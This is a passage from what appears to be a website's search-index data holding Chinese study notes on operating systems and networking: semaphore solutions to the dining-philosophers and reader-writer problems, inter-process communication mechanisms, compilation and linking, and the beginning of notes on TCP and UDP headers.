} void put_two(i) { down(&mutex); state[i] = THINKING; check(LEFT); // \u5C1D\u8BD5\u901A\u77E5\u5DE6\u53F3\u90BB\u5C45\uFF0C\u81EA\u5DF1\u5403\u5B8C\u4E86\uFF0C\u4F60\u4EEC\u53EF\u4EE5\u5F00\u59CB\u5403\u4E86 check(RIGHT); up(&mutex);
} void eat(int i) { down(&mutex); state[i] = EATING; up(&mutex);
} // \u68C0\u67E5\u4E24\u4E2A\u90BB\u5C45\u662F\u5426\u90FD\u6CA1\u6709\u7528\u9910\uFF0C\u5982\u679C\u662F\u7684\u8BDD\uFF0C\u5C31 up(&s[i])\uFF0C\u4F7F\u5F97 down(&s[i]) \u80FD\u591F\u5F97\u5230\u901A\u77E5\u5E76\u7EE7\u7EED\u6267\u884C
void check(i) { if(state[i] == HUNGRY && state[LEFT] != EATING && state[RIGHT] !=EATING) { state[i] = EATING; up(&s[i]); }
}`},{header:"2. \u8BFB\u8005-\u5199\u8005\u95EE\u9898",slug:"_2-\u8BFB\u8005-\u5199\u8005\u95EE\u9898",content:`\u5141\u8BB8\u591A\u4E2A\u8FDB\u7A0B\u540C\u65F6\u5BF9\u6570\u636E\u8FDB\u884C\u8BFB\u64CD\u4F5C\uFF0C\u4F46\u662F\u4E0D\u5141\u8BB8\u8BFB\u548C\u5199\u4EE5\u53CA\u5199\u548C\u5199\u64CD\u4F5C\u540C\u65F6\u53D1\u751F\u3002
\u4E00\u4E2A\u6574\u578B\u53D8\u91CF count \u8BB0\u5F55\u5728\u5BF9\u6570\u636E\u8FDB\u884C\u8BFB\u64CD\u4F5C\u7684\u8FDB\u7A0B\u6570\u91CF\uFF0C\u4E00\u4E2A\u4E92\u65A5\u91CF count_mutex \u7528\u4E8E\u5BF9 count \u52A0\u9501\uFF0C\u4E00\u4E2A\u4E92\u65A5\u91CF data_mutex \u7528\u4E8E\u5BF9\u8BFB\u5199\u7684\u6570\u636E\u52A0\u9501\u3002
typedef int semaphore;
semaphore count_mutex = 1;
semaphore data_mutex = 1;
int count = 0; void reader() { while(TRUE) { down(&count_mutex); count++; if(count == 1) down(&data_mutex); // \u7B2C\u4E00\u4E2A\u8BFB\u8005\u9700\u8981\u5BF9\u6570\u636E\u8FDB\u884C\u52A0\u9501\uFF0C\u9632\u6B62\u5199\u8FDB\u7A0B\u8BBF\u95EE up(&count_mutex); read(); down(&count_mutex); count--; if(count == 0) up(&data_mutex); up(&count_mutex); }
} void writer() { while(TRUE) { down(&data_mutex); write(); up(&data_mutex); }
}
\u4EE5\u4E0B\u5185\u5BB9\u7531 @Bandi Yugandhar \u63D0\u4F9B\u3002
The first case may result Writer to starve. This case favous Writers i.e no writer, once added to the queue, shall be kept waiting longer than absolutely necessary(only when there are readers that entered the queue before the writer).
int readcount, writecount; //(initial value = 0)
semaphore rmutex, wmutex, readLock, resource; //(initial value = 1) //READER
void reader() {
<ENTRY Section> down(&readLock); // reader is trying to enter down(&rmutex); // lock to increase readcount readcount++; if (readcount == 1) down(&resource); //if you are the first reader then lock the resource up(&rmutex); //release for other readers up(&readLock); //Done with trying to access the resource <CRITICAL Section>
//reading is performed <EXIT Section> down(&rmutex); //reserve exit section - avoids race condition with readers readcount--; //indicate you're leaving if (readcount == 0) //checks if you are last reader leaving up(&resource); //if last, you must release the locked resource up(&rmutex); //release exit section for other readers
} //WRITER
void writer() { <ENTRY Section> down(&wmutex); //reserve entry section for writers - avoids race conditions writecount++; //report yourself as a writer entering if (writecount == 1) //checks if you're first writer down(&readLock); //if you're first, then you must lock the readers out. Prevent them from trying to enter CS up(&wmutex); //release entry section <CRITICAL Section> down(&resource); //reserve the resource for yourself - prevents other writers from simultaneously editing the shared resource //writing is performed up(&resource); //release file <EXIT Section> down(&wmutex); //reserve exit section writecount--; //indicate you're leaving if (writecount == 0) //checks if you're the last writer up(&readLock); //if you're last writer, you must unlock the readers. Allows them to try enter CS for reading up(&wmutex); //release exit section
}
We can observe that every reader is forced to acquire ReadLock. On the otherhand, writers doesn\u2019t need to lock individually. Once the first writer locks the ReadLock, it will be released only when there is no writer left in the queue.
From the both cases we observed that either reader or writer has to starve. Below solutionadds the constraint that no thread shall be allowed to starve; that is, the operation of obtaining a lock on the shared data will always terminate in a bounded amount of time.
int readCount; // init to 0; number of readers currently accessing resource // all semaphores initialised to 1
Semaphore resourceAccess; // controls access (read/write) to the resource
Semaphore readCountAccess; // for syncing changes to shared variable readCount
Semaphore serviceQueue; // FAIRNESS: preserves ordering of requests (signaling must be FIFO) void writer()
{ down(&serviceQueue); // wait in line to be servicexs // <ENTER> down(&resourceAccess); // request exclusive access to resource // </ENTER> up(&serviceQueue); // let next in line be serviced // <WRITE> writeResource(); // writing is performed // </WRITE> // <EXIT> up(&resourceAccess); // release resource access for next reader/writer // </EXIT>
} void reader()
{ down(&serviceQueue); // wait in line to be serviced down(&readCountAccess); // request exclusive access to readCount // <ENTER> if (readCount == 0) // if there are no readers already reading: down(&resourceAccess); // request resource access for readers (writers blocked) readCount++; // update count of active readers // </ENTER> up(&serviceQueue); // let next in line be serviced up(&readCountAccess); // release access to readCount // <READ> readResource(); // reading is performed // </READ> down(&readCountAccess); // request exclusive access to readCount // <EXIT> readCount--; // update count of active readers if (readCount == 0) // if there are no readers left: up(&resourceAccess); // release resource access for all // </EXIT> up(&readCountAccess); // release access to readCount
}`},{header:"\u8FDB\u7A0B\u901A\u4FE1",slug:"\u8FDB\u7A0B\u901A\u4FE1",content:`\u8FDB\u7A0B\u540C\u6B65\u4E0E\u8FDB\u7A0B\u901A\u4FE1\u5F88\u5BB9\u6613\u6DF7\u6DC6\uFF0C\u5B83\u4EEC\u7684\u533A\u522B\u5728\u4E8E\uFF1A \u8FDB\u7A0B\u540C\u6B65\uFF1A\u63A7\u5236\u591A\u4E2A\u8FDB\u7A0B\u6309\u4E00\u5B9A\u987A\u5E8F\u6267\u884C\uFF1B
\u8FDB\u7A0B\u901A\u4FE1\uFF1A\u8FDB\u7A0B\u95F4\u4F20\u8F93\u4FE1\u606F\u3002 \u8FDB\u7A0B\u901A\u4FE1\u662F\u4E00\u79CD\u624B\u6BB5\uFF0C\u800C\u8FDB\u7A0B\u540C\u6B65\u662F\u4E00\u79CD\u76EE\u7684\u3002\u4E5F\u53EF\u4EE5\u8BF4\uFF0C\u4E3A\u4E86\u80FD\u591F\u8FBE\u5230\u8FDB\u7A0B\u540C\u6B65\u7684\u76EE\u7684\uFF0C\u9700\u8981\u8BA9\u8FDB\u7A0B\u8FDB\u884C\u901A\u4FE1\uFF0C\u4F20\u8F93\u4E00\u4E9B\u8FDB\u7A0B\u540C\u6B65\u6240\u9700\u8981\u7684\u4FE1\u606F\u3002`},{header:"1. \u7BA1\u9053",slug:"_1-\u7BA1\u9053",content:`\u7BA1\u9053\u662F\u901A\u8FC7\u8C03\u7528 pipe \u51FD\u6570\u521B\u5EFA\u7684\uFF0Cfd[0] \u7528\u4E8E\u8BFB\uFF0Cfd[1] \u7528\u4E8E\u5199\u3002
#include <unistd.h>
int pipe(int fd[2]);
\u5B83\u5177\u6709\u4EE5\u4E0B\u9650\u5236\uFF1A \u53EA\u652F\u6301\u534A\u53CC\u5DE5\u901A\u4FE1\uFF08\u5355\u5411\u4EA4\u66FF\u4F20\u8F93\uFF09\uFF1B
\u53EA\u80FD\u5728\u7236\u5B50\u8FDB\u7A0B\u6216\u8005\u5144\u5F1F\u8FDB\u7A0B\u4E2D\u4F7F\u7528\u3002`},{header:"2. FIFO",slug:"_2-fifo",content:`\u4E5F\u79F0\u4E3A\u547D\u540D\u7BA1\u9053\uFF0C\u53BB\u9664\u4E86\u7BA1\u9053\u53EA\u80FD\u5728\u7236\u5B50\u8FDB\u7A0B\u4E2D\u4F7F\u7528\u7684\u9650\u5236\u3002
#include <sys/stat.h>
int mkfifo(const char *path, mode_t mode);
int mkfifoat(int fd, const char *path, mode_t mode);
FIFO \u5E38\u7528\u4E8E\u5BA2\u6237-\u670D\u52A1\u5668\u5E94\u7528\u7A0B\u5E8F\u4E2D\uFF0CFIFO \u7528\u4F5C\u6C47\u805A\u70B9\uFF0C\u5728\u5BA2\u6237\u8FDB\u7A0B\u548C\u670D\u52A1\u5668\u8FDB\u7A0B\u4E4B\u95F4\u4F20\u9012\u6570\u636E\u3002`},{header:"3. \u6D88\u606F\u961F\u5217",slug:"_3-\u6D88\u606F\u961F\u5217",content:`\u76F8\u6BD4\u4E8E FIFO\uFF0C\u6D88\u606F\u961F\u5217\u5177\u6709\u4EE5\u4E0B\u4F18\u70B9\uFF1A \u6D88\u606F\u961F\u5217\u53EF\u4EE5\u72EC\u7ACB\u4E8E\u8BFB\u5199\u8FDB\u7A0B\u5B58\u5728\uFF0C\u4ECE\u800C\u907F\u514D\u4E86 FIFO \u4E2D\u540C\u6B65\u7BA1\u9053\u7684\u6253\u5F00\u548C\u5173\u95ED\u65F6\u53EF\u80FD\u4EA7\u751F\u7684\u56F0\u96BE\uFF1B
\u907F\u514D\u4E86 FIFO \u7684\u540C\u6B65\u963B\u585E\u95EE\u9898\uFF0C\u4E0D\u9700\u8981\u8FDB\u7A0B\u81EA\u5DF1\u63D0\u4F9B\u540C\u6B65\u65B9\u6CD5\uFF1B
\u8BFB\u8FDB\u7A0B\u53EF\u4EE5\u6839\u636E\u6D88\u606F\u7C7B\u578B\u6709\u9009\u62E9\u5730\u63A5\u6536\u6D88\u606F\uFF0C\u800C\u4E0D\u50CF FIFO \u90A3\u6837\u53EA\u80FD\u9ED8\u8BA4\u5730\u63A5\u6536\u3002`},{header:"4. \u4FE1\u53F7\u91CF",slug:"_4-\u4FE1\u53F7\u91CF",content:"\u5B83\u662F\u4E00\u4E2A\u8BA1\u6570\u5668\uFF0C\u7528\u4E8E\u4E3A\u591A\u4E2A\u8FDB\u7A0B\u63D0\u4F9B\u5BF9\u5171\u4EAB\u6570\u636E\u5BF9\u8C61\u7684\u8BBF\u95EE\u3002"},{header:"5. \u5171\u4EAB\u5B58\u50A8",slug:"_5-\u5171\u4EAB\u5B58\u50A8",content:`\u5141\u8BB8\u591A\u4E2A\u8FDB\u7A0B\u5171\u4EAB\u4E00\u4E2A\u7ED9\u5B9A\u7684\u5B58\u50A8\u533A\u3002\u56E0\u4E3A\u6570\u636E\u4E0D\u9700\u8981\u5728\u8FDB\u7A0B\u4E4B\u95F4\u590D\u5236\uFF0C\u6240\u4EE5\u8FD9\u662F\u6700\u5FEB\u7684\u4E00\u79CD IPC\u3002
\u9700\u8981\u4F7F\u7528\u4FE1\u53F7\u91CF\u7528\u6765\u540C\u6B65\u5BF9\u5171\u4EAB\u5B58\u50A8\u7684\u8BBF\u95EE\u3002
\u591A\u4E2A\u8FDB\u7A0B\u53EF\u4EE5\u5C06\u540C\u4E00\u4E2A\u6587\u4EF6\u6620\u5C04\u5230\u5B83\u4EEC\u7684\u5730\u5740\u7A7A\u95F4\u4ECE\u800C\u5B9E\u73B0\u5171\u4EAB\u5185\u5B58\u3002\u53E6\u5916 XSI \u5171\u4EAB\u5185\u5B58\u4E0D\u662F\u4F7F\u7528\u6587\u4EF6\uFF0C\u800C\u662F\u4F7F\u7528\u5185\u5B58\u7684\u533F\u540D\u6BB5\u3002`},{header:"6. \u5957\u63A5\u5B57",slug:"_6-\u5957\u63A5\u5B57",content:"\u4E0E\u5176\u5B83\u901A\u4FE1\u673A\u5236\u4E0D\u540C\u7684\u662F\uFF0C\u5B83\u53EF\u7528\u4E8E\u4E0D\u540C\u673A\u5668\u95F4\u7684\u8FDB\u7A0B\u901A\u4FE1\u3002"}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%20-%20%E9%93%BE%E6%8E%A5.html",title:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u94FE\u63A5",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u94FE\u63A5",slug:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF-\u94FE\u63A5",content:`\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF - \u94FE\u63A5 \u7F16\u8BD1\u7CFB\u7EDF
\u9759\u6001\u94FE\u63A5
\u76EE\u6807\u6587\u4EF6
\u52A8\u6001\u94FE\u63A5`},{header:"\u7F16\u8BD1\u7CFB\u7EDF",slug:"\u7F16\u8BD1\u7CFB\u7EDF",content:`\u4EE5\u4E0B\u662F\u4E00\u4E2A hello.c \u7A0B\u5E8F\uFF1A
#include <stdio.h> int main()
{ printf("hello, world\\n"); return 0;
}
\u5728 Unix \u7CFB\u7EDF\u4E0A\uFF0C\u7531\u7F16\u8BD1\u5668\u628A\u6E90\u6587\u4EF6\u8F6C\u6362\u4E3A\u76EE\u6807\u6587\u4EF6\u3002
gcc -o hello hello.c
\u8FD9\u4E2A\u8FC7\u7A0B\u5927\u81F4\u5982\u4E0B\uFF1A
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b396d726-b75f-4a32-89a2-03a7b6e19f6f.jpg" width="800) \u9884\u5904\u7406\u9636\u6BB5\uFF1A\u5904\u7406\u4EE5 # \u5F00\u5934\u7684\u9884\u5904\u7406\u547D\u4EE4\uFF1B
\u7F16\u8BD1\u9636\u6BB5\uFF1A\u7FFB\u8BD1\u6210\u6C47\u7F16\u6587\u4EF6\uFF1B
\u6C47\u7F16\u9636\u6BB5\uFF1A\u5C06\u6C47\u7F16\u6587\u4EF6\u7FFB\u8BD1\u6210\u53EF\u91CD\u5B9A\u4F4D\u76EE\u6807\u6587\u4EF6\uFF1B
\u94FE\u63A5\u9636\u6BB5\uFF1A\u5C06\u53EF\u91CD\u5B9A\u4F4D\u76EE\u6807\u6587\u4EF6\u548C printf.o \u7B49\u5355\u72EC\u9884\u7F16\u8BD1\u597D\u7684\u76EE\u6807\u6587\u4EF6\u8FDB\u884C\u5408\u5E76\uFF0C\u5F97\u5230\u6700\u7EC8\u7684\u53EF\u6267\u884C\u76EE\u6807\u6587\u4EF6\u3002`},{header:"\u9759\u6001\u94FE\u63A5",slug:"\u9759\u6001\u94FE\u63A5",content:`\u9759\u6001\u94FE\u63A5\u5668\u4EE5\u4E00\u7EC4\u53EF\u91CD\u5B9A\u4F4D\u76EE\u6807\u6587\u4EF6\u4E3A\u8F93\u5165\uFF0C\u751F\u6210\u4E00\u4E2A\u5B8C\u5168\u94FE\u63A5\u7684\u53EF\u6267\u884C\u76EE\u6807\u6587\u4EF6\u4F5C\u4E3A\u8F93\u51FA\u3002\u94FE\u63A5\u5668\u4E3B\u8981\u5B8C\u6210\u4EE5\u4E0B\u4E24\u4E2A\u4EFB\u52A1\uFF1A \u7B26\u53F7\u89E3\u6790\uFF1A\u6BCF\u4E2A\u7B26\u53F7\u5BF9\u5E94\u4E8E\u4E00\u4E2A\u51FD\u6570\u3001\u4E00\u4E2A\u5168\u5C40\u53D8\u91CF\u6216\u4E00\u4E2A\u9759\u6001\u53D8\u91CF\uFF0C\u7B26\u53F7\u89E3\u6790\u7684\u76EE\u7684\u662F\u5C06\u6BCF\u4E2A\u7B26\u53F7\u5F15\u7528\u4E0E\u4E00\u4E2A\u7B26\u53F7\u5B9A\u4E49\u5173\u8054\u8D77\u6765\u3002
\u91CD\u5B9A\u4F4D\uFF1A\u94FE\u63A5\u5668\u901A\u8FC7\u628A\u6BCF\u4E2A\u7B26\u53F7\u5B9A\u4E49\u4E0E\u4E00\u4E2A\u5185\u5B58\u4F4D\u7F6E\u5173\u8054\u8D77\u6765\uFF0C\u7136\u540E\u4FEE\u6539\u6240\u6709\u5BF9\u8FD9\u4E9B\u7B26\u53F7\u7684\u5F15\u7528\uFF0C\u4F7F\u5F97\u5B83\u4EEC\u6307\u5411\u8FD9\u4E2A\u5185\u5B58\u4F4D\u7F6E\u3002`},{header:"\u76EE\u6807\u6587\u4EF6",slug:"\u76EE\u6807\u6587\u4EF6",content:`\u53EF\u6267\u884C\u76EE\u6807\u6587\u4EF6\uFF1A\u53EF\u4EE5\u76F4\u63A5\u5728\u5185\u5B58\u4E2D\u6267\u884C\uFF1B
\u53EF\u91CD\u5B9A\u4F4D\u76EE\u6807\u6587\u4EF6\uFF1A\u53EF\u4E0E\u5176\u5B83\u53EF\u91CD\u5B9A\u4F4D\u76EE\u6807\u6587\u4EF6\u5728\u94FE\u63A5\u9636\u6BB5\u5408\u5E76\uFF0C\u521B\u5EFA\u4E00\u4E2A\u53EF\u6267\u884C\u76EE\u6807\u6587\u4EF6\uFF1B
\u5171\u4EAB\u76EE\u6807\u6587\u4EF6\uFF1A\u8FD9\u662F\u4E00\u79CD\u7279\u6B8A\u7684\u53EF\u91CD\u5B9A\u4F4D\u76EE\u6807\u6587\u4EF6\uFF0C\u53EF\u4EE5\u5728\u8FD0\u884C\u65F6\u88AB\u52A8\u6001\u52A0\u8F7D\u8FDB\u5185\u5B58\u5E76\u94FE\u63A5\uFF1B`},{header:"\u52A8\u6001\u94FE\u63A5",slug:"\u52A8\u6001\u94FE\u63A5",content:`\u9759\u6001\u5E93\u6709\u4EE5\u4E0B\u4E24\u4E2A\u95EE\u9898\uFF1A \u5F53\u9759\u6001\u5E93\u66F4\u65B0\u65F6\u90A3\u4E48\u6574\u4E2A\u7A0B\u5E8F\u90FD\u8981\u91CD\u65B0\u8FDB\u884C\u94FE\u63A5\uFF1B
\u5BF9\u4E8E printf \u8FD9\u79CD\u6807\u51C6\u51FD\u6570\u5E93\uFF0C\u5982\u679C\u6BCF\u4E2A\u7A0B\u5E8F\u90FD\u8981\u6709\u4EE3\u7801\uFF0C\u8FD9\u4F1A\u6781\u5927\u6D6A\u8D39\u8D44\u6E90\u3002 \u5171\u4EAB\u5E93\u662F\u4E3A\u4E86\u89E3\u51B3\u9759\u6001\u5E93\u7684\u8FD9\u4E24\u4E2A\u95EE\u9898\u800C\u8BBE\u8BA1\u7684\uFF0C\u5728 Linux \u7CFB\u7EDF\u4E2D\u901A\u5E38\u7528 .so \u540E\u7F00\u6765\u8868\u793A\uFF0CWindows \u7CFB\u7EDF\u4E0A\u5B83\u4EEC\u88AB\u79F0\u4E3A DLL\u3002\u5B83\u5177\u6709\u4EE5\u4E0B\u7279\u70B9\uFF1A \u5728\u7ED9\u5B9A\u7684\u6587\u4EF6\u7CFB\u7EDF\u4E2D\u4E00\u4E2A\u5E93\u53EA\u6709\u4E00\u4E2A\u6587\u4EF6\uFF0C\u6240\u6709\u5F15\u7528\u8BE5\u5E93\u7684\u53EF\u6267\u884C\u76EE\u6807\u6587\u4EF6\u90FD\u5171\u4EAB\u8FD9\u4E2A\u6587\u4EF6\uFF0C\u5B83\u4E0D\u4F1A\u88AB\u590D\u5236\u5230\u5F15\u7528\u5B83\u7684\u53EF\u6267\u884C\u6587\u4EF6\u4E2D\uFF1B
\u5728\u5185\u5B58\u4E2D\uFF0C\u4E00\u4E2A\u5171\u4EAB\u5E93\u7684 .text \u8282\uFF08\u5DF2\u7F16\u8BD1\u7A0B\u5E8F\u7684\u673A\u5668\u4EE3\u7801\uFF09\u7684\u4E00\u4E2A\u526F\u672C\u53EF\u4EE5\u88AB\u4E0D\u540C\u7684\u6B63\u5728\u8FD0\u884C\u7684\u8FDB\u7A0B\u5171\u4EAB\u3002`}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.html",title:"",pathLocale:"/",contents:[{header:"",slug:"",content:"\u8BA1\u7B97\u673A\u64CD\u4F5C\u7CFB\u7EDF"}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%20-%20%E4%BC%A0%E8%BE%93%E5%B1%82.html",title:"\u8BA1\u7B97\u673A\u7F51\u7EDC - \u4F20\u8F93\u5C42",pathLocale:"/",contents:[{header:"\u8BA1\u7B97\u673A\u7F51\u7EDC - \u4F20\u8F93\u5C42",slug:"\u8BA1\u7B97\u673A\u7F51\u7EDC-\u4F20\u8F93\u5C42",content:`\u8BA1\u7B97\u673A\u7F51\u7EDC - \u4F20\u8F93\u5C42 UDP \u548C TCP \u7684\u7279\u70B9
UDP \u9996\u90E8\u683C\u5F0F
TCP \u9996\u90E8\u683C\u5F0F
TCP \u7684\u4E09\u6B21\u63E1\u624B
TCP \u7684\u56DB\u6B21\u6325\u624B
TCP \u53EF\u9760\u4F20\u8F93
TCP \u6ED1\u52A8\u7A97\u53E3
TCP \u6D41\u91CF\u63A7\u5236
TCP \u62E5\u585E\u63A7\u5236 1. \u6162\u5F00\u59CB\u4E0E\u62E5\u585E\u907F\u514D
2. \u5FEB\u91CD\u4F20\u4E0E\u5FEB\u6062\u590D \u7F51\u7EDC\u5C42\u53EA\u628A\u5206\u7EC4\u53D1\u9001\u5230\u76EE\u7684\u4E3B\u673A\uFF0C\u4F46\u662F\u771F\u6B63\u901A\u4FE1\u7684\u5E76\u4E0D\u662F\u4E3B\u673A\u800C\u662F\u4E3B\u673A\u4E2D\u7684\u8FDB\u7A0B\u3002\u4F20\u8F93\u5C42\u63D0\u4F9B\u4E86\u8FDB\u7A0B\u95F4\u7684\u903B\u8F91\u901A\u4FE1\uFF0C\u4F20\u8F93\u5C42\u5411\u9AD8\u5C42\u7528\u6237\u5C4F\u853D\u4E86\u4E0B\u9762\u7F51\u7EDC\u5C42\u7684\u6838\u5FC3\u7EC6\u8282\uFF0C\u4F7F\u5E94\u7528\u7A0B\u5E8F\u770B\u8D77\u6765\u50CF\u662F\u5728\u4E24\u4E2A\u4F20\u8F93\u5C42\u5B9E\u4F53\u4E4B\u95F4\u6709\u4E00\u6761\u7AEF\u5230\u7AEF\u7684\u903B\u8F91\u901A\u4FE1\u4FE1\u9053\u3002`},{header:"UDP \u548C TCP \u7684\u7279\u70B9",slug:"udp-\u548C-tcp-\u7684\u7279\u70B9",content:"\u7528\u6237\u6570\u636E\u62A5\u534F\u8BAE UDP\uFF08User Datagram Protocol\uFF09\u662F\u65E0\u8FDE\u63A5\u7684\uFF0C\u5C3D\u6700\u5927\u53EF\u80FD\u4EA4\u4ED8\uFF0C\u6CA1\u6709\u62E5\u585E\u63A7\u5236\uFF0C\u9762\u5411\u62A5\u6587\uFF08\u5BF9\u4E8E\u5E94\u7528\u7A0B\u5E8F\u4F20\u4E0B\u6765\u7684\u62A5\u6587\u4E0D\u5408\u5E76\u4E5F\u4E0D\u62C6\u5206\uFF0C\u53EA\u662F\u6DFB\u52A0 UDP \u9996\u90E8\uFF09\uFF0C\u652F\u6301\u4E00\u5BF9\u4E00\u3001\u4E00\u5BF9\u591A\u3001\u591A\u5BF9\u4E00\u548C\u591A\u5BF9\u591A\u7684\u4EA4\u4E92\u901A\u4FE1\u3002 \u4F20\u8F93\u63A7\u5236\u534F\u8BAE TCP\uFF08Transmission Control Protocol\uFF09\u662F\u9762\u5411\u8FDE\u63A5\u7684\uFF0C\u63D0\u4F9B\u53EF\u9760\u4EA4\u4ED8\uFF0C\u6709\u6D41\u91CF\u63A7\u5236\uFF0C\u62E5\u585E\u63A7\u5236\uFF0C\u63D0\u4F9B\u5168\u53CC\u5DE5\u901A\u4FE1\uFF0C\u9762\u5411\u5B57\u8282\u6D41\uFF08\u628A\u5E94\u7528\u5C42\u4F20\u4E0B\u6765\u7684\u62A5\u6587\u770B\u6210\u5B57\u8282\u6D41\uFF0C\u628A\u5B57\u8282\u6D41\u7EC4\u7EC7\u6210\u5927\u5C0F\u4E0D\u7B49\u7684\u6570\u636E\u5757\uFF09\uFF0C\u6BCF\u4E00\u6761 TCP \u8FDE\u63A5\u53EA\u80FD\u662F\u70B9\u5BF9\u70B9\u7684\uFF08\u4E00\u5BF9\u4E00\uFF09\u3002"},{header:"UDP \u9996\u90E8\u683C\u5F0F",slug:"udp-\u9996\u90E8\u683C\u5F0F",content:`![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d4c3a4a1-0846-46ec-9cc3-eaddfca71254.jpg" width="600)
\u9996\u90E8\u5B57\u6BB5\u53EA\u6709 8 \u4E2A\u5B57\u8282\uFF0C\u5305\u62EC\u6E90\u7AEF\u53E3\u3001\u76EE\u7684\u7AEF\u53E3\u3001\u957F\u5EA6\u3001\u68C0\u9A8C\u548C\u300212 \u5B57\u8282\u7684\u4F2A\u9996\u90E8\u662F\u4E3A\u4E86\u8BA1\u7B97\u68C0\u9A8C\u548C\u4E34\u65F6\u6DFB\u52A0\u7684\u3002`},{header:"TCP \u9996\u90E8\u683C\u5F0F",slug:"tcp-\u9996\u90E8\u683C\u5F0F",content:'![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/55dc4e84-573d-4c13-a765-52ed1dd251f9.png" width="700) \u5E8F\u53F7 \uFF1A\u7528\u4E8E\u5BF9\u5B57\u8282\u6D41\u8FDB\u884C\u7F16\u53F7\uFF0C\u4F8B\u5982\u5E8F\u53F7\u4E3A 301\uFF0C\u8868\u793A\u7B2C\u4E00\u4E2A\u5B57\u8282\u7684\u7F16\u53F7\u4E3A 301\uFF0C\u5982\u679C\u643A\u5E26\u7684\u6570\u636E\u957F\u5EA6\u4E3A 100 \u5B57\u8282\uFF0C\u90A3\u4E48\u4E0B\u4E00\u4E2A\u62A5\u6587\u6BB5\u7684\u5E8F\u53F7\u5E94\u4E3A 401\u3002 \u786E\u8BA4\u53F7 \uFF1A\u671F\u671B\u6536\u5230\u7684\u4E0B\u4E00\u4E2A\u62A5\u6587\u6BB5\u7684\u5E8F\u53F7\u3002\u4F8B\u5982 B \u6B63\u786E\u6536\u5230 A \u53D1\u9001\u6765\u7684\u4E00\u4E2A\u62A5\u6587\u6BB5\uFF0C\u5E8F\u53F7\u4E3A 501\uFF0C\u643A\u5E26\u7684\u6570\u636E\u957F\u5EA6\u4E3A 200 \u5B57\u8282\uFF0C\u56E0\u6B64 B \u671F\u671B\u4E0B\u4E00\u4E2A\u62A5\u6587\u6BB5\u7684\u5E8F\u53F7\u4E3A 701\uFF0CB \u53D1\u9001\u7ED9 A \u7684\u786E\u8BA4\u62A5\u6587\u6BB5\u4E2D\u786E\u8BA4\u53F7\u5C31\u4E3A 701\u3002 \u6570\u636E\u504F\u79FB \uFF1A\u6307\u7684\u662F\u6570\u636E\u90E8\u5206\u8DDD\u79BB\u62A5\u6587\u6BB5\u8D77\u59CB\u5904\u7684\u504F\u79FB\u91CF\uFF0C\u5B9E\u9645\u4E0A\u6307\u7684\u662F\u9996\u90E8\u7684\u957F\u5EA6\u3002 \u786E\u8BA4 ACK \uFF1A\u5F53 ACK=1 \u65F6\u786E\u8BA4\u53F7\u5B57\u6BB5\u6709\u6548\uFF0C\u5426\u5219\u65E0\u6548\u3002TCP \u89C4\u5B9A\uFF0C\u5728\u8FDE\u63A5\u5EFA\u7ACB\u540E\u6240\u6709\u4F20\u9001\u7684\u62A5\u6587\u6BB5\u90FD\u5FC5\u987B\u628A ACK \u7F6E 1\u3002 \u540C\u6B65 SYN \uFF1A\u5728\u8FDE\u63A5\u5EFA\u7ACB\u65F6\u7528\u6765\u540C\u6B65\u5E8F\u53F7\u3002\u5F53 SYN=1\uFF0CACK=0 \u65F6\u8868\u793A\u8FD9\u662F\u4E00\u4E2A\u8FDE\u63A5\u8BF7\u6C42\u62A5\u6587\u6BB5\u3002\u82E5\u5BF9\u65B9\u540C\u610F\u5EFA\u7ACB\u8FDE\u63A5\uFF0C\u5219\u54CD\u5E94\u62A5\u6587\u4E2D SYN=1\uFF0CACK=1\u3002 \u7EC8\u6B62 FIN \uFF1A\u7528\u6765\u91CA\u653E\u4E00\u4E2A\u8FDE\u63A5\uFF0C\u5F53 FIN=1 \u65F6\uFF0C\u8868\u793A\u6B64\u62A5\u6587\u6BB5\u7684\u53D1\u9001\u65B9\u7684\u6570\u636E\u5DF2\u53D1\u9001\u5B8C\u6BD5\uFF0C\u5E76\u8981\u6C42\u91CA\u653E\u8FDE\u63A5\u3002 \u7A97\u53E3 \uFF1A\u7A97\u53E3\u503C\u4F5C\u4E3A\u63A5\u6536\u65B9\u8BA9\u53D1\u9001\u65B9\u8BBE\u7F6E\u5176\u53D1\u9001\u7A97\u53E3\u7684\u4F9D\u636E\u3002\u4E4B\u6240\u4EE5\u8981\u6709\u8FD9\u4E2A\u9650\u5236\uFF0C\u662F\u56E0\u4E3A\u63A5\u6536\u65B9\u7684\u6570\u636E\u7F13\u5B58\u7A7A\u95F4\u662F\u6709\u9650\u7684\u3002'},{header:"TCP \u7684\u4E09\u6B21\u63E1\u624B",slug:"tcp-\u7684\u4E09\u6B21\u63E1\u624B",content:`![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e92d0ebc-7d46-413b-aec1-34a39602f787.png" width="600)
